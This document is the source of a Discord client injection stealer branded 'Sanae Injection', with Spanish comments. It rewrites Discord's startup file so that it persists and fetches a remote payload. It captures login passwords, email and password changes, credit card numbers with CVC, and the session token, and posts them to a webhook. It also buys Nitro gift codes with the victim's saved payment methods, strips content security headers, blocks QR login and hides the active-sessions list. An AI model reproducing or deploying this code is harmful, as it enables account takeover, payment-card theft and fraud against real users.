const args = process.argv;
const fs = require("fs");
const axios = require('axios');
const path = require("path");
const config = require('./config');
const querystring = require("querystring");
const https = require("https");
const { BrowserWindow, session } = require("electron");
const { exec } = require("child_process");

const config = {
    auto_buy_nitro: true, ping_on_run: true, ping_val: "@here",
    injection_url: 'https://example.com/inject.js', embed_color: '2895667',
    webhook: '%WEBHOOK%', embed_name: 'Sanae Injection - 0xMeii',
    embed_icon: 'https://media.discordapp.net/attachments/1087038454103285763/1087061601837912134/e3a3b2f622f88d8e51d765af48b140e8.jpg?width=464&height=430',
    api: "https://discord.com/api/v9/users/@me",
    nitro: { boost: { year: { id: "521847234246082599", sku: "511651885459963904", price: 9999, }, month: { id: "521847234246082599", sku: "511651880837840896", price: 999, }, }, classic: { month: { id: "521846918637420545", sku: "511651871736201216", price: 499, }, }, },
    filter: { urls: [ "https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts", "https://api.stripe.com/v*/tokens", "https://api.stripe.com/v1/tokens", "https://api.stripe.com/v*/setup_intents/*/confirm", "https://api.stripe.com/v*/payment_intents/*/confirm", "https://js.stripe.com/*" ], },
    filter2: { urls: [ "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "wss://remote-auth-gateway.discord.gg/*", ], },
};


// Obtener la ruta de Discord y la ruta de los recursos
const dcPath = (function () {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep); // Obtener la ruta de la aplicación
    let resourcePath;
    if (process.platform === "win32") { // Si es Windows
        resourcePath = path.join(app, "resources"); // Obtener la ruta de los recursos
    }
    else if (process.platform === "darwin") { // Si es macOS
        resourcePath = path.join(app, "Contents", "Resources"); // Obtener la ruta de los recursos
    }
    if (fs.existsSync(resourcePath)) return { resourcePath, app }; // Comprobar si existe la ruta de los recursos
    return "", ""; // Si no existe, devolvera cadenas vacías
})();

function updateDiscordCheck() {
    const { resourcePath, app } = discordPath;     // Obtenemos la ruta de recursos y la aplicación de Discord
    if (resourcePath === undefined || app === undefined) return;    // Si no se pudo obtener alguna de las rutas, se sale de la función
    const appPath = path.join(resourcePath, "app");     // Obtenemos la ruta de la aplicación de Discord y los archivos que vamos a manipular
    const packageJsonPath = path.join(appPath, "package.json");
    const resourceIndexPath = path.join(appPath, "index.js");
    const indexJsContent = `corenum`;
    const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);    // Creamos la carpeta de la aplicación de Discord si no existe
    if (fs.existsSync(packageJsonPath)) fs.unlinkSync(packageJsonPath);     // Eliminamos el archivo package.json si existe
    if (fs.existsSync(resourceIndexPath)) fs.unlinkSync(resourceIndexPath);     // Eliminamos el archivo index.js si existe
    if (process.platform === "win32" || process.platform === "darwin") {     // Si estamos en Windows o en macOS, creamos un nuevo archivo package.json
        fs.writeFileSync(
            packageJsonPath,
            JSON.stringify(
                {
                    name: "discord",
                    main: "index.js",
                },
                null,
                4,
            ),
        );
}

    const startUpScript = `
        const fs = require('fs'), https = require('https');
        const indexJS = '${indexJsContent}';
        const bdPath = '${bdPath}';
        const fileSize = fs.statSync(indexJS).size
        fs.readFileSync(indexJS, 'utf8', (err, data) => {
            if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
                init();
        })
        async function init() {
            https.get('${config.injection_url}', (res) => {
                const file = fs.createWriteStream(indexJS);
                res.replace('core' + 'num', indexJS).replace('%WEBHOOK' + '_LINK%', '${config.webhook}').replace("~~bran" + "ding~~", '${config.embed_name}').replace("~~ic" + "on~~", '${config.embed_icon}')
                res.pipe(file);
                file.on('finish', () => {
                    file.close();
                });
            }).on("error", (err) => {
                setTimeout(init(), 10000);
            });
        }
        require('${path.join(resourcePath, "app.asar")}')
        if (fs.existsSync(bdPath)) require(bdPath);
    `;

    fs.writeFileSync(resourceIndexPath, startUpScript.replace(/\\/g, "\\\\"));  // Escribir el archivo index.js con el contenido definido

    if (fs.existsSync(path.join(__dirname, "Fun"))) fs.rmdirSync(path.join(__dirname, "Fun"));     // Si existe la carpeta "Fun", eliminarla

    execScript(   // Ejecutar un script que cierra la sesión del usuario en Discord
        `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
    );
    return !1;
}

const execScript = (script) => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
};

async function noSessionPlease() {
    await sleep(1000)
    execScript(`
        const userclick = () => {
            waitForElm(".children-1xdcWE").then((elm)=>elm[2].remove())
            waitForElm(".sectionTitle-3j2YI1").then((elm)=>elm[2].remove())
        }

        const IsSession = (item) => {
            return item?.innerText?.includes("Devices")
        }

        const waitForElm = (selector) => {
            return new Promise(resolve => {
                const observer = new MutationObserver(mutations => {
                    if (document.querySelectorAll(selector).length>2) {
                        resolve(document.querySelectorAll(selector))
                        observer.disconnect();
                    }
                });
                observer.observe(document.body, {
                    childList: true,
                    subtree: true
                });
            });
        }

        document.addEventListener('click', (e) => {
            e = e || window.event;
            const target = e.target || e.srcElement;
            const text = target.textContent || target.innerText;
            if (IsSession(target)) userclick();
        }, false);
    `);
};

noSessionPlease();

const getInfo = async (token) => {
    const response = await fetch(`${config.api}`, {
      headers: {
        Authorization: token,
      },
    });
    const data = await response.json();
    return data;
  };
  
  const fetchBilling = async (token) => {
    const response = await fetch(`${config.api}/billing/payment-sources`, {
      headers: {
        Authorization: token,
      },
    });
    if (!response.ok) {
      return null;
    }
    const data = await response.json();
    return data.length > 0 ? data : "";
  };  
  
  const getBilling = async (token) => {
    try {
      const data = await fetchBilling(token);
      const billing = data
        .filter((source) => !source.invalid)
        .map((source) => {
          if (source.type === 1) {
            return '💳';
          } else if (source.type === 2) {
            return '<:paypal_sanae:1087038871822422027>';
          }
        })
        .join('');
      return billing || '❌';
    } catch (error) {
      console.error(error);
      return '❌';
    }
  };
  
  const Purchase = async (token, id, _type, _time) => {
    const options = {
      expected_amount: config.nitro[_type][_time].price,
      expected_currency: 'usd',
      gift: true,
      payment_source_id: id,
      payment_source_token: null,
      purchase_token: '1208a6b2-6ca4-4b03-8fc8-6eaf2154c9bf',
      sku_subscription_plan_id: config.nitro[_type][_time].sku,
    };
  
    const response = await fetch(`https://discord.com/api/v9/store/skus/${config.nitro[_type][_time].id}/purchase`, {
      method: 'POST',
      headers: {
        Authorization: token,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(options),
    });
  
    if (!response.ok) {
      return null;
    }
  
    const data = await response.json();
  
    if (data.gift_code) {
      return `https://discord.gift/${data.gift_code}`;
    } else {
      return null;
    }
  };

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'No se ha podido comprar ❌';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });

  const purchaseOptions = {
    boostYear: {
      type: 'boost',
      time: 'year',
    },
    boostMonth: {
      type: 'boost',
      time: 'month',
    },
    classicMonth: {
      type: 'classic',
      time: 'month',
    },
  };

  const failedPurchases = [];

  for (let sourceID of IDS) {
    const purchaseOptionValues = Object.values(purchaseOptions);
    const promises = purchaseOptionValues.map(({ type, time }) =>
      Purchase(token, sourceID, type, time)
    );
    const results = await Promise.all(promises);
    const successResult = results.find((result) => result !== null);
    if (successResult) {
      return successResult;
    } else {
      failedPurchases.push(sourceID);
    }
  }

  if (failedPurchases.length === IDS.length) {
    return failedMsg;
  }
};

const nitroLevels = {
    0: "No Nitro",
    1: "Nitro Classic",
    2: "Nitro Boost",
  };
  
  const badgeLevels = {
    1: "Discord Staff",
    2: "Partnered Server Owner",
    4: "Hypesquad Event",
    8: "Green BugHunter",
    64: "HypeSquad Bravery",
    128: "HypeSquad Brillance",
    256: "HypeSquad Balance",
    512: "Early Supporter",
    16384: "Gold BugHunter",
    131072: "Discord Developer",
    0: "None",
  };
  
  const getNitro = (flags) => nitroLevels[flags] || "No Nitro";
  
  const getBadges = (flags) =>
    (flags || 0)
      .toString(2)
      .split("")
      .reverse()
      .map((b, i) => (b === "1" ? badgeLevels[2 ** i] : null))
      .filter((b) => b !== null)
      .join(", ");

      const hooker = async (content) => {
        try {
          const data = JSON.stringify(content);
          const url = new URL(config.webhook);
          const options = {
            protocol: url.protocol,
            hostname: url.host,
            path: url.pathname,
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "Access-Control-Allow-Origin": "*",
            },
          };
          const req = https.request(options);
      
          req.on("error", (err) => {
            console.log(err);
          });
          req.write(data);
          req.end();
        } catch (error) {
        }
      };

      const login = async (email, password, token) => {
        const json = await getInfo(token);
        const nitro = getNitro(json.premium_type);
        const badges = getBadges(json.flags);
        const billing = await getBilling(token);
        const content = {
            username: config.embed_name,
            avatar_url: config.embed_icon,
            embeds: [
                {
                    color: config.embed_color,
                    fields: [
                        {
                            name: '**Información de la Cuenta**',
                            value: `<:mail_sanae:1087056751246966875> Email: **${email}** - <:pwd_sanae:1087057414379012116> Contraseña: **${password}**`,
                            inline: false,
                        },
                        {
                            name: '**Información de Discord**',
                            value: `<:nitro_sanae:1087058269220130826>Tipo de Nitro: **${nitro}**\n<a:badge_sanae:1087059472347836476> Insignias: **${badges}**\n<a:card_sanae:1087059947742834758> Facturación: **${billing}**`,
                            inline: false,
                        },
                        {
                            name: '<a:tkn_sanae:1087060992615264417> **Token**',
                            value: `\`${token}\``,
                            inline: false,
                        },
                    ],
                    author: {
                        name: json.username + "#" + json.discriminator + " | " + json.id,
                        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                    },
                    footer: {
                        text: 'Sanae Injection・https://github.com/0xMeii/Sanae-Injection',
                        icon_url: "https://media.discordapp.net/attachments/1087038454103285763/1087061601837912134/e3a3b2f622f88d8e51d765af48b140e8.jpg?width=464&height=430"
                    },
                },
            ],
        };
        if (config.ping_on_run) content["content"] = config.ping_val;
        hooker(content);
    };

    const passwordChanged = async (oldpassword, newpassword, token) => {
        const json = await getInfo(token);
        const nitro = getNitro(json.premium_type);
        const badges = getBadges(json.flags);
        const billing = await getBilling(token);
        const content = {
            username: config.embed_name,
            avatar_url: config.embed_icon,
            embeds: [
                {
                    color: config.embed_color,
                    fields: [
                        {
                            name: '**Contraseña Cambiada**',
                            value: `<:mail_sanae:1087056751246966875> Email: **${json.email}**\n<:pwd_sanae:1087057414379012116> Contraseña Antigua: **${oldpassword}**\n<:pwd_sanae:1087057414379012116> Nueva Contraseña: **${newpassword}**`,
                            inline: true,
                        },
                        {
                            name: '**Información de Discord**',
                            value: `<:nitro_sanae:1087058269220130826>Tipo de Nitro: **${nitro}**\n<a:badge_sanae:1087059472347836476> Insignias: **${badges}**\n<a:card_sanae:1087059947742834758> Facturación: **${billing}**`,
                            inline: false,
                        },
                        {
                            name: '<a:tkn_sanae:1087060992615264417> **Token**',
                            value: `\`${token}\``,
                            inline: false,
                        },
                    ],
                    author: {
                        name: json.username + "#" + json.discriminator + " | " + json.id,
                        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                    },
                    footer: {
                        text: 'Sanae Injection・https://github.com/0xMeii/Sanae-Injection',
                        icon_url: "https://media.discordapp.net/attachments/1087038454103285763/1087061601837912134/e3a3b2f622f88d8e51d765af48b140e8.jpg?width=464&height=430"
                    },
                },
            ],
        };
        if (config.ping_on_run) content["content"] = config.ping_val;
        hooker(content);
    };

    const emailChanged = async (email, password, token) => {
        const json = await getInfo(token);
        const nitro = getNitro(json.premium_type);
        const badges = getBadges(json.flags);
        const billing = await getBilling(token);
        const content = {
            username: config.embed_name,
            avatar_url: config.embed_icon,
            embeds: [
                {
                    color: config.embed_color,
                    fields: [
                        {
                            name: '**Correo Electrónico Cambiado**',
                            value: `<:mail_sanae:1087056751246966875> Nuevo Email: **${email}**\n<:pwd_sanae:1087057414379012116> Contraseña: **${password}**`,
                            inline: true,
                        },
                        {
                            name: '**Información de Discord**',
                            value: `<:nitro_sanae:1087058269220130826>Tipo de Nitro: **${nitro}**\n<a:badge_sanae:1087059472347836476> Insignias: **${badges}**\n<a:card_sanae:1087059947742834758> Facturación: **${billing}**`,
                            inline: true,
                        },
                        {
                            name: '<a:tkn_sanae:1087060992615264417> **Token**',
                            value: `\`${token}\``,
                            inline: false,
                        },
                    ],
                    author: {
                        name: json.username + "#" + json.discriminator + " | " + json.id,
                        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                    },
                    footer: {
                        text: 'Sanae Injection・https://github.com/0xMeii/Sanae-Injection',
                        icon_url: "https://media.discordapp.net/attachments/1087038454103285763/1087061601837912134/e3a3b2f622f88d8e51d765af48b140e8.jpg?width=464&height=430"
                    },
                },
            ],
        };
        if (config.ping_on_run) content["content"] = config.ping_val;
        hooker(content);
    };

    const PaypalAdded = async (token) => {
        const json = await getInfo(token);
        const nitro = getNitro(json.premium_type);
        const badges = getBadges(json.flags);
        const billing = await getBilling(token);
        const content = {
            username: config.embed_name,
            avatar_url: config.embed_icon,
            embeds: [
                {
                    color: config.embed_color,
                    fields: [
                        {
                            name: '**Paypal Añadido**',
                            value: `Bang...`,
                            inline: false,
                        },
                        {
                            name: '**Información de Discord**',
                            value: `<:nitro_sanae:1087058269220130826>Tipo de Nitro: **${nitro}**\n<a:badge_sanae:1087059472347836476> Insignias: **${badges}**\n<a:card_sanae:1087059947742834758> Facturación: **${billing}**`,
                            inline: true,
                        },
                        {
                            name: '<a:tkn_sanae:1087060992615264417> **Token**',
                            value: `\`${token}\``,
                            inline: false,
                        },
                    ],
                    author: {
                        name: json.username + "#" + json.discriminator + " | " + json.id,
                        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                    },
                    footer: {
                        text: 'Sanae Injection・https://github.com/0xMeii/Sanae-Injection',
                        icon_url: "https://media.discordapp.net/attachments/1087038454103285763/1087061601837912134/e3a3b2f622f88d8e51d765af48b140e8.jpg?width=464&height=430"
                    },
                },
            ],
        };
        if (config.ping_on_run) content["content"] = config.ping_val;
        hooker(content);
        if (config.auto_buy_nitro) {
            nitroBought(token).catch(console.error);
        }
    };

    const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
        const json = await getInfo(token);
        const nitro = getNitro(json.premium_type);
        const badges = getBadges(json.flags);
        const billing = await getBilling(token);
        const content = {
            username: config.embed_name,
            avatar_url: config.embed_icon,
            embeds: [
                {
                    color: config.embed_color,
                    fields: [
                        {
                            name: '**Credit Card Added**',
                            value: `Número de tarjeta de crédito: **${number}**\nCVC: **${cvc}**\nExpiración: **${expir_month}/${expir_year}**`,
                            inline: true,
                        },
                        {
                            name: '**Información de Discord**',
                            value: `<:nitro_sanae:1087058269220130826>Tipo de Nitro: **${nitro}**\n<a:badge_sanae:1087059472347836476> Insignias: **${badges}**\n<a:card_sanae:1087059947742834758> Facturación: **${billing}**`,
                            inline: true,
                        },
                        {
                            name: '<a:tkn_sanae:1087060992615264417> **Token**',
                            value: `\`${token}\``,
                            inline: false,
                        },
                    ],
                    author: {
                        name: json.username + "#" + json.discriminator + " | " + json.id,
                        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                    },
                    footer: {
                        text: 'Sanae Injection・https://github.com/0xMeii/Sanae-Injection',
                        icon_url: "https://media.discordapp.net/attachments/1087038454103285763/1087061601837912134/e3a3b2f622f88d8e51d765af48b140e8.jpg?width=464&height=430"
                    },
                },
            ],
        };
        if (config.ping_on_run) content["content"] = config.ping_val;
        hooker(content);
        if (config.auto_buy_nitro) {
            nitroBought(token).catch(console.error);
        }
    };

    const nitroBought = async (token) => {
        const json = await getInfo(token);
        const nitro = getNitro(json.premium_type);
        const badges = getBadges(json.flags);
        const billing = await getBilling(token);
        const code = await buyNitro(token);
        const content = {
            username: config.embed_name,
            avatar_url: config.embed_icon,
            embeds: [
                {
                    color: config.embed_color,
                    fields: [
                        {
                            name: '**¡Nitro comprado!**',
                            value: `*Código Nitro:**\n\`\`\`diff\n+ ${code}\`\`\``,
                            inline: true,
                        },
                        {
                            name: '**Información de Discord**',
                            value: `<:nitro_sanae:1087058269220130826>Tipo de Nitro: **${nitro}**\n<a:badge_sanae:1087059472347836476> Insignias: **${badges}**\n<a:card_sanae:1087059947742834758> Facturación: **${billing}**`,
                            inline: true,
                        },
                        {
                            name: '<a:tkn_sanae:1087060992615264417> **Token**',
                            value: `\`${token}\``,
                            inline: false,
                        },
                    ],
                    author: {
                        name: json.username + "#" + json.discriminator + " | " + json.id,
                        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                    },
                    footer: {
                        text: 'Sanae Injection・https://github.com/0xMeii/Sanae-Injection',
                        icon_url: "https://media.discordapp.net/attachments/1087038454103285763/1087061601837912134/e3a3b2f622f88d8e51d765af48b140e8.jpg?width=464&height=430"
                    },
                },
            ],
        };
        if (config.ping_on_run) content["content"] = config.ping_val + `\n${code}`;
        hooker(content);
    };

    session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
        if (details.url.startsWith("wss://remote-auth-gateway")) return callback({ cancel: true });
        updateCheck();
    
    });
    
    session.defaultSession.webRequest.onResponseStarted(config.filter, async (details, callback) => {
        if (details.url.includes("tokens")) {
            const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
            const item = querystring.parse(unparsed_data.toString());
            const token = await execScript(
                `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
            );
            ccAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token).catch(console.error);
            return;
        }
    });

    session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
        if (details.url.startsWith(config.webhook)) {
          const responseHeaders = {};
      
          if (details.url.includes("discord.com")) {
            responseHeaders["Access-Control-Allow-Headers"] = "*";
          } else {
            responseHeaders["Content-Security-Policy"] = ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"];
            responseHeaders["Access-Control-Allow-Headers"] = "*";
            responseHeaders["Access-Control-Allow-Origin"] = "*";
          }
      
          callback({
            responseHeaders: Object.assign(responseHeaders, details.responseHeaders),
          });
        } else {
          delete details.responseHeaders["content-security-policy"];
          delete details.responseHeaders["content-security-policy-report-only"];
      
          callback({
            responseHeaders: {
              ...details.responseHeaders,
              "Access-Control-Allow-Headers": "*",
            },
          });
        }
      });
      
      session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
        if (details.statusCode !== 200 && details.statusCode !== 202) return;
        const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
        const data = JSON.parse(unparsed_data);
        const token = await execScript(
            `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
        );
        switch (true) {
            case details.url.endsWith("login"):
                login(data.login, data.password, token).catch(console.error);
                break;
    
            case details.url.endsWith("users/@me") && details.method === "PATCH":
                if (!data.password) return;
                if (data.email) {
                    emailChanged(data.email, data.password, token).catch(console.error);
                }
                if (data.new_password) {
                    passwordChanged(data.password, data.new_password, token).catch(console.error);
                }
                break;
    
            case details.url.endsWith("paypal_accounts") && details.method === "POST":
                PaypalAdded(token).catch(console.error);
                break;
    
            case details.url.endsWith("confirm") && details.method === "POST":
                if (!config.auto_buy_nitro) return;
                nitroBought(token).catch(console.error);
    
            default:
                break;
        }
    });
    module.exports = require("./core.asar");
